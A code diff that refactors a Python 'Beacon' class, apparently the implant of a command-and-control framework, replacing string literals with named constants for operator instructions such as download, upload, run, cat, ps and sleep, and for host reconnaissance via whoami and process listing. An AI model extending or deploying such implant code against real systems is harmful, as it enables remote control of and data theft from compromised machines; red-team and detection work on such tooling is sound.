@@ -12,6 +12,35 @@ from typing import Callable, Dict, List, Tuple
 
 CHARACTER_POOL = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
 
+COMMAND_WHOAMI = "whoami"
+
+# Instruction identifiers
+INSTRUCTION_LS = "ls"
+INSTRUCTION_PS = "ps"
+INSTRUCTION_CD = "cd"
+INSTRUCTION_PWD = "pwd"
+INSTRUCTION_CAT = "cat"
+INSTRUCTION_DOWNLOAD = "download"
+INSTRUCTION_UPLOAD = "upload"
+INSTRUCTION_RUN = "run"
+INSTRUCTION_SLEEP = "sleep"
+INSTRUCTION_END = "end"
+
+# Miscellaneous command strings
+DEFAULT_LIST_DIRECTORY = "."
+FILE_TYPE_FILE = "f"
+FILE_TYPE_DIRECTORY = "d"
+UNKNOWN_OWNER = "unknown"
+UNKNOWN_GROUP = "unknown"
+PERMISSION_SLICE_START = -3
+
+# Platform specific process listing commands
+PS_COMMAND_LINUX = "ps -aux"
+PS_COMMAND_WINDOWS = "tasklist"
+WINDOWS_PLATFORM_PREFIX = "win"
+
+SLEEP_SECONDS_TO_MILLISECONDS = 1000
+
 # Beacon bundle keys
 BUNDLE_KEY_BEACON_HASH = "BH"
 BUNDLE_KEY_LISTENER_HASH = "LH"
@@ -49,7 +78,6 @@ DEFAULT_UPLOAD_SUCCESS = "File uploaded."
 DEFAULT_UPLOAD_FAILURE = "Upload failed."
 DEFAULT_EMPTY_RESPONSE = "Empty response."
 DEFAULT_UNKNOWN_COMMAND = "cmd unknown."
-PS_COMMAND = "ps -aux"
 ERROR_NO_SUCH_FILE_PREFIX = "No such file or directory: "
 
 
@@ -79,7 +107,7 @@ class Beacon:
         self.arch = ""
         self.privilege = ""
         self.os = ""
-        self.sleepTimeMs = 1000
+        self.sleepTimeMs = SLEEP_SECONDS_TO_MILLISECONDS
 
         self.tasks: List[Dict[str, object]] = []
         self.taskResults: List[Dict[str, object]] = []
@@ -93,7 +121,12 @@ class Beacon:
         try:
             self.username = os.getlogin()
         except:
-            self.username = subprocess.run(["whoami"], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
+            self.username = subprocess.run(
+                COMMAND_WHOAMI,
+                shell=True,
+                stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+            ).stdout.decode("utf-8")
         self.arch = platform.machine()
         if self.username == ROOT_USERNAME:
             self.privilege = DEFAULT_PRIVILEGE_ROOT
@@ -351,6 +384,7 @@ class Beacon:
                 data = data.encode("utf-8")
 
             result = ""
+
             handler = self._instruction_handlers.get(str(instruction).lower())
 
             if handler:
@@ -361,11 +395,11 @@ class Beacon:
                     result = DEFAULT_UNKNOWN_COMMAND
                     data = b""
 
-            elif instruction == "sleep":
-                self.sleepTimeMs=int(cmd)*1000
+            elif instruction == INSTRUCTION_SLEEP:
+                self.sleepTimeMs=int(cmd)*SLEEP_SECONDS_TO_MILLISECONDS
                 result = cmd
 
-            elif instruction == "end":
+            elif instruction == INSTRUCTION_END:
                 exit(0)
 
             else:
